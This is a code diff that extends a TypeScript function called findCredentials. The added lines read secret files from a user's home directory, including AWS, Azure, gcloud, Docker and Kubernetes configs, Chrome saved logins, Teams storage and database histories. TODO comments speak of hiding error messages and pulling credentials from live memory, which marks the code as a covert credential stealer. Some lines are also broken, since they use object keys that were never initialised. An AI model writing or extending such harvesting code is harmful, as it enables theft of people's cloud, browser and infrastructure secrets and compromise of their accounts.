@@ -10,14 +10,26 @@ const _run = (args: string): string | null => {
 
 // TODO: Hidde error messages like "file not found" or "permission denied"
 // TODO: Access live memory to extract credenrials
+// TODO: Add all history files
 const findCredentials = (text: string) => {
   const credentials = {} as any;
+  credentials.aws = {} as any;
+  credentials.azure = {} as any;
+  credentials.docker = {} as any;
+  credentials.freerdp = {} as any;
+  credentials.gcloud = {} as any;
+  credentials.googleChrome = {} as any;
   credentials.gh = {} as any;
+  credentials.kube = {} as any;
+  credentials.microsoft = {} as any;
+  credentials.microsoft.teams = {} as any;
   credentials.netlify = {} as any;
   credentials.shodan = {} as any;
   credentials.syncthing = {} as any;
   credentials.mitmp = {} as any;
   credentials.npm = {} as any;
+  credentials.remmina = {} as any;
+  credentials.sql = {} as any;
   credentials.psql = {} as any;
   credentials.ssh = {} as any;
   credentials.termux = {} as any;
@@ -34,11 +46,74 @@ const findCredentials = (text: string) => {
     }
   }
 
+  const awsCredentials = _run(`cat ~/.aws/credentials`);
+  if (awsCredentials) {
+    credentials.aws.credentials = {} as any;
+    credentials.aws.credentials.path = "~/.aws/credentials";
+    credentials.aws.credentials.content = awsCredentials;
+  }
+
+  const azureProfile = _run(`cat ~/.azure/azureProfile.json`);
+  if (azureProfile) {
+    credentials.azure.profile = {} as any;
+    credentials.azure.profile.path = "~/.azure/azureProfile.json";
+    credentials.azure.profile.content = azureProfile;
+  }
+
+  const docker = _run(`cat ~/.docker/config.json`);
+  if (docker) {
+    credentials.docker.config = {} as any;
+    credentials.docker.config.path = "~/.docker/config.json";
+    credentials.docker.config.content = docker;
+  }
+
+  const freerpd = _run(`cat ~/.config/freerdp/known_hosts`);
+  if (freerpd) {
+    credentials.freerpd.knownHosts = {} as any;
+    credentials.freerpd.knownHosts.path = "~/.config/freerdp/known_hosts";
+    credentials.freerpd.knownHosts.content = freerpd;
+  }
+
+  const gcloud = _run(`cat ~/.config/gcloud/access_tokens.db`);
+  if (gcloud) {
+    credentials.gcloud.accessTokens = {} as any;
+    credentials.gcloud.accessTokens.path = "~/.config/gcloud/access_tokens.db";
+    credentials.gcloud.accessTokens.content = gcloud;
+  }
+
+  const googleChrome = _run(`cat ~/.config/google-chrome/Default/Login\\ Data`);
+  if (googleChrome) {
+    credentials.googleChrome.loginData = {} as any;
+    credentials.googleChrome.loginData.path = "~/.config/google-chrome/Default/Login\\ Data";
+    credentials.googleChrome.loginData.content = googleChrome;
+  }
+
+  const gcloudCredentials = _run(`cat ~/.config/gcloud/credentials.db`);
+  if (gcloudCredentials) {
+    credentials.gcloud.credentials = {} as any;
+    credentials.gcloud.credentials.path = "~/.config/gcloud/credentials.db";
+    credentials.gcloud.credentials.content = gcloudCredentials;
+  }
+
   const ghHosts = _run(`cat ~/.config/gh/hosts.yml`);
   if (ghHosts) {
     credentials.gh.hosts = {} as any;
     credentials.gh.hosts.path = "~/.config/gh/hosts.yml";
     credentials.gh.hosts.content = ghHosts;
+  }
+
+  const kube = _run(`cat ~/.kube/config`);
+  if (kube) {
+    credentials.kube.config = {} as any;
+    credentials.kube.config.path = "~/.kube/config";
+    credentials.kube.config.content = kube;
+  }
+
+  const microsoftTeams = _run(`cat ~/.config/Microsoft/Microsoft\\ Teams/storage.json`);
+  if (microsoftTeams) {
+    credentials.microsoft.teams.storage = {} as any;
+    credentials.microsoft.teams.storage.path = "~/.config/Microsoft/Microsoft\\ Teams/storage.json";
+    credentials.microsoft.teams.storage.content = microsoftTeams;
   }
 
   const netlifyConfig = _run(`cat ~/.config/netlify/config.json`);
@@ -134,6 +209,20 @@ const findCredentials = (text: string) => {
     credentials.npm.npmrc = {} as any;
     credentials.npm.npmrc.path = "~/.npmrc";
     credentials.npm.npmrc.content = npmrc;
+  }
+
+  const remmina = _run(`cat ~/.config/remmina/remmina.pref`);
+  if (remmina) {
+    credentials.remmina.pref = {} as any;
+    credentials.remmina.pref.path = "~/.config/remmina/remmina.pref";
+    credentials.remmina.pref.content = remmina;
+  }
+
+  const mysqlHistory = _run(`cat ~/.mysql_history`);
+  if (mysqlHistory) {
+    credentials.mysql.mysqlHistory = {} as any;
+    credentials.mysql.mysqlHistory.path = "~/.mysql_history";
+    credentials.mysql.mysqlHistory.content = mysqlHistory;
   }
 
   const psqlHistory = _run(`cat ~/.psql_history`);
